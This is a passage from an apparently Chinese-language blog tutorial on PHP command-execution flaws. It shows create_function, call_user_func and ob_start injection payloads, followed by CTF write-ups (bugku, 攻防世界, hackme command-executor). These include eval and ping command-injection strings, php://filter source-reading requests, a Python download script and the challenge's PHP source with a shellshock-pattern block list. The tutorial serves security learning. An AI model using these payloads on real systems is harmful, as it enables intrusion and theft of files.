<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sort_by = $_GET[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">$sorter = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">$sort_function = <span class="string">&#x27; return 1 * &#x27;</span> . $sorter . <span class="string">&#x27;($a[&quot;&#x27;</span> . $sort_by . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . $sort_by . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">usort($databases, create_function(‘$a, $b’, $sort_function));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先构造出函数原型：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">$a,$b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>($a[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> . &#x27;&quot;</span>], $b[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> . &#x27;&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据这个，我们可以构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort_by&#x3D;”]);&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
<p>传入后得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return 1 * strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo();&#x2F;*”], $b[&quot;&quot;]);&#125;phpinfo();&#x2F;*”]);</span><br></pre></td></tr></table></figure>
<p>很显然，经过<code>/*</code>注释符</p>
<p>我们剩下的只有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test($a,$b)&#123;</span><br><span class="line">return 1 * strnatcasecmp($a[&quot;&quot;]);&#125;</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>案例：<a href="https://blog.knownsec.com/2016/10/wordpress-4-6-1-language-exploit/">WordPress &lt;= 4.6.1 使用语言文件任意代码执行</a></p>
</blockquote>
<h4 id="call-user-func-函数">call_user_func()函数</h4>
<p><code>call_user_func(callable parameter [, mixed $… ]])</code>把第一个参数作为回调函数调用。</p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	call_user_func($_GET[<span class="string">&#x27;a&#x27;</span>],$_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
<h4 id="ob-start">ob_start()</h4>
<p>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</p>
<p>函数描述：此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。</p>
<p>内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。</p>
<p>比如有如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$key = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">ob_start($key);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ls -al&#x27;</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="comment"># -rw-r–r– 1 root root    0 Mar 12 06:46 tets</span></span><br></pre></td></tr></table></figure>
<p>因为这里的$sky被作为输出的回调函数，而我们输入的<code>ls -al</code>在缓冲区，经过ob_end_flush()输出缓冲区后，可以得到<code>system('ls -al')</code>，这样的操作，所以成功执行了命令。</p>
<h2 id="从CTF看命令执行漏洞的利用">从CTF看命令执行漏洞的利用</h2>
<h3 id="bugku-本地包含">bugku 本地包含</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200107201708.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>打开看到代码，两个要注意的点</p>
<ul>
<li>$a = @<em>a</em>=@_REQUEST[‘hello’];</li>
<li>eval( “var_dump($a);”);</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190702122901351.png" alt="在这里插入图片描述"></p>
<p>第一个的意思就是不管你是post还是get传参，request都能获取到hello的值<br>
第二个看到eval()命令执行函数，也就是说，eval可以执行括号内的php命令</p>
<p>如果可以构造一些可执行的php代码，则eval就会全部执行达到我们想要的目的，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello&#x3D;);print_r(file(“flag.php”)</span><br><span class="line"></span><br><span class="line">hello&#x3D;);var_dump(file(“flag.php”)</span><br><span class="line"></span><br><span class="line">hello&#x3D;file(“flag.php”)</span><br><span class="line"></span><br><span class="line">hello&#x3D;file_get_contents(‘flag.php’)</span><br><span class="line"></span><br><span class="line">hello&#x3D;);include(@$_POST[‘b’]</span><br><span class="line"></span><br><span class="line">- 在POST区域：b&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line"></span><br><span class="line">hello&#x3D;);include(“php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php”</span><br><span class="line"></span><br><span class="line">hello&#x3D;1);show_source(‘flag.php’);var_dump(</span><br><span class="line"></span><br><span class="line">hello&#x3D;1);show_source(%27flag.php%27);var_dump(3</span><br></pre></td></tr></table></figure>
<p>分别会有什么样的结果呢：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval( “var_dump();print_r(file(“flag.php”));”);</span><br><span class="line"></span><br><span class="line">eval( “var_dump();var_dump(file(“flag.php”));”);</span><br><span class="line"></span><br><span class="line">eval( “var_dump(file(“flag.php”));”);</span><br><span class="line"></span><br><span class="line">eval( “var_dump(file_get_contents(‘flag.php’));”);</span><br><span class="line"></span><br><span class="line">eval( “var_dump();include(@$_POST[‘b’]);”);</span><br><span class="line"></span><br><span class="line">eval( “var_dump();include(“php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php”);”);</span><br><span class="line"></span><br><span class="line">- b&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line"></span><br><span class="line">eval( “var_dump(1);show_source(‘flag.php’);var_dump();”);</span><br><span class="line"></span><br><span class="line">eval( “var_dump(1);show_source(%27flag.php%27);var_dump(3);”);</span><br></pre></td></tr></table></figure>
<p>最终都可以get flag。</p>
<ul>
<li>eval() 函数存在命令执行漏洞，构造出文件包含会把字符串参数当做代码来执行。</li>
<li>file() 函数把整个文件读入一个数组中，并将文件作为一个数组返回。</li>
<li>print_r() 函数只用于输出数组。</li>
<li>var_dump() 函数可以输出任何内容：输出变量的容，类型或字符串的内容，类型，长度。</li>
<li>hello=file(“flag.php”)，最终会得到var_dump(file(“flag.php”))，以数组形式输出文件内容。</li>
<li>include()函数和php://input，php://filter结合很好用，php://filter可以用与读取文件源代码，结果是源代码base64编码后的结果。</li>
</ul>
<h3 id="攻防世界-command-execution">攻防世界 command execution</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200107202854.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>ping一个 127.0.0.1 | ls …/…/…/home<br>
只执行后面半句，看到…/…/…/home目录下的所有文件，就看到了flag.txt</p>
<p>查看flag.txt 用cat命令 127.0.0.1 | cat …/…/…/home/flag.txt<br>
就可以get flag</p>
<blockquote>
<p>Windows：</p>
<p>| 直接执行后面的语句 ping 127.0.0.1|whoami<br>
|| 前面出错执行后面的 ，前面为假 ping 2 || whoami<br>
&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>
&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p>
<p>Linux：</p>
<p>| 管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br>
|| 当前面的执行出错时执行后面的 ping 1||whoami<br>
&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>
&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p>
</blockquote>
<h3 id="hackme-command-executor">hackme command executor</h3>
<p>题目地址：<a href="https://command-executor.hackme.inndy.tw/index.php">command-executor</a>——来源于 <a href="https://hackme.inndy.tw/">HackMe</a></p>
<p>题目涉及到的考察点：</p>
<ol>
<li>文件包含读源码</li>
<li>代码分析（PHP，C）</li>
<li>CVE shellshock</li>
<li>反弹shell</li>
<li>Linux下输出输入重定向</li>
</ol>
<p>首先题目提供了几个模块，第一个是<code>man</code>命令的帮助文档：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110121849.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>选择了<code>bash</code>参数发现多了一个<code>file=bash</code>的请求参数，尝试使用其他命令，比如：<code>pwd</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110122148.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>猜测<code>eval(&quot;man /bin/&quot; + command)</code>或者一些其他的目录。</p>
<p>Tar Tester界面可以上传压缩包但是并没有解压，只是<code>tar -tvf test.tar</code>查看压缩包内的内容。</p>
<p>Cmd Exec只能执行两个命令：<code>ls</code>、<code>env</code>。</p>
<p>List Files可以列举几个目录。</p>
<p>再观察题目url的形式：<code>https://command-executor.hackme.inndy.tw/index.php?func=untar</code>等均带有<code>func=xxx</code>参数来展示页面，猜测会有文件包含漏洞，尝试使用<code>func=php://filter/read=convert.base64-encode/resource=index</code>读取文件内容，成功得到回显：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110122806.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>我们可以用下面这个脚本分别把主页和其他四个模块的PHP源码下载下来：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=&quot;</span></span><br><span class="line">file_list = [<span class="string">&quot;index&quot;</span>,<span class="string">&quot;man&quot;</span>,<span class="string">&quot;untar&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">    res = requests.get(url+i)</span><br><span class="line">    print(<span class="string">&quot;dowload &quot;</span>+i)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        res.encoding=<span class="string">&quot;utf8&quot;</span></span><br><span class="line">    <span class="keyword">with</span> codecs.open(i+<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;w+&quot;</span>,<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> handle:</span><br><span class="line">        print(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        text = BeautifulSoup(res.text,<span class="string">&quot;lxml&quot;</span>).text.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        handle.write(base64.b64decode(text).decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">&#x27;man&#x27;</span>, <span class="string">&#x27;Man&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;untar&#x27;</span>, <span class="string">&#x27;Tar Tester&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;Cmd Exec&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;List files&#x27;</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span>(<span class="params">$msg</span>) </span>&#123;</span><br><span class="line">    header(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">&#x27;\/flag&#x27;</span>, <span class="string">&#x27;\(\)\s*\&#123;\s*:;\s*\&#125;;&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$b</span>/&quot;</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">&quot;<span class="subst">$b</span> detected! exit now.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$cmd, $shell=<span class="string">&#x27;bash&#x27;</span></span>) </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">&#x27;%s -c %s&#x27;</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">&#x27;HTTP_&#x27;</span>) &#123;</span><br><span class="line">        putenv(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$val</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;func&#x27;</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$page</span>.php&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_default</span>(<span class="params"></span>) </span>&#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;Welcome to <span class="keyword">use</span> <span class="title">our</span> <span class="title">developer</span> <span class="title">assistant</span> <span class="title">service</span>. <span class="title">We</span> <span class="title">provide</span> <span class="title">servial</span> <span class="title">useless</span> <span class="title">features</span> <span class="title">to</span> <span class="title">make</span> <span class="title">your</span> <span class="title">developing</span> <span class="title">life</span> <span class="title">harder</span>.&lt;/<span class="title">p</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">windows</span>-<span class="title">run</span>.<span class="title">jpg</span>&quot; <span class="title">alt</span>=&quot;<span class="title">command</span> <span class="title">executor</span>&quot;&gt;</span><br><span class="line">&lt;?<span class="title">php</span> &#125;</span><br><span class="line">?&gt;&lt;!<span class="title">DOCTYPE</span> <span class="title">html</span>&gt;</span><br><span class="line">&lt;<span class="title">html</span> <span class="title">lang</span>=&quot;<span class="title">en</span>&quot;&gt;</span><br><span class="line">  &lt;<span class="title">head</span>&gt;</span><br><span class="line">    &lt;<span class="title">meta</span> <span class="title">charset</span>=&quot;<span class="title">UTF</span>-8&quot;&gt;</span><br><span class="line">    &lt;<span class="title">title</span>&gt;<span class="title">Command</span> <span class="title">Executor</span>&lt;/<span class="title">title</span>&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">stylesheet</span>&quot; <span class="title">href</span>=&quot;<span class="title">bootstrap</span>/<span class="title">css</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">css</span>&quot; <span class="title">media</span>=&quot;<span class="title">all</span>&quot;&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">stylesheet</span>&quot; <span class="title">href</span>=&quot;<span class="title">comic</span>-<span class="title">neue</span>/<span class="title">font</span>.<span class="title">css</span>&quot; <span class="title">media</span>=&quot;<span class="title">all</span>&quot;&gt;</span><br><span class="line">    &lt;<span class="title">style</span>&gt;</span><br><span class="line">      <span class="title">nav</span> &#123; <span class="title">margin</span>-<span class="title">bottom</span>: 1<span class="title">rem</span>; &#125;</span><br><span class="line">      img &#123; max-width: <span class="number">100</span>%; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">      &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($pages <span class="keyword">as</span> <span class="keyword">list</span>($file, $title)): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">          &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>; <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&#x27;render&#x27;)) render(); else render_default(); ?&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>man.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $file = <span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        $file = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[\w\-]+$/&#x27;</span>, $file) !== <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Invalid file name!&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Online documents&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    $cmds = [</span><br><span class="line">        <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;cp&#x27;</span>, <span class="string">&#x27;mv&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($cmds <span class="keyword">as</span> $cmd) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=man&amp;file=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;</span>, $cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&#x27;&lt;h2&gt;$ man %s&lt;/h2&gt;&#x27;</span>, htmlentities($file));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    execute(sprintf(<span class="string">&#x27;man %s | cat&#x27;</span>, escapeshellarg($file)));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>untar.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;Tar file tester&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Please upload a tar file to test&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;index.php?func=untar&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tarfile&quot;</span> id=<span class="string">&quot;tarfile&quot;</span>&gt;</span><br><span class="line">  &lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Upload &amp;amp; Test&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;tarfile&#x27;</span>])) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;&#x27;</span>, htmlentities($_FILES[<span class="string">&#x27;tarfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        execute(sprintf(<span class="string">&#x27;tar -tvf %s 2&gt;&amp;1&#x27;</span>, escapeshellarg($_FILES[<span class="string">&#x27;tarfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>cmd.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        $cmd = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;Command Execution&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    $cmds = [<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;env&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>($cmds <span class="keyword">as</span> $c) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=cmd&amp;cmd=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;</span>, $c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;func&quot;</span> value=<span class="string">&quot;cmd&quot;</span>&gt;</span><br><span class="line">  &lt;div class=&quot;input-group&quot;&gt;</span><br><span class="line">    &lt;input class=&quot;form-control&quot; type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;cmd&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;input-group-append&quot;&gt;</span><br><span class="line">      &lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Execute&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;cmd.focus();&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($cmd) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;h2&gt;$ %s&lt;/h2&gt;&#x27;</span>, htmlentities($cmd));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">switch</span> ($cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;env&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;ls&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;ls -l&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;ls -al&#x27;</span>:</span><br><span class="line">            execute($cmd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;cat flag&#x27;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;cat-flag.png&quot; alt=&quot;cat flag&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printf(<span class="string">&#x27;%s: command not found&#x27;</span>, htmlentities($cmd));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ls.php</p>
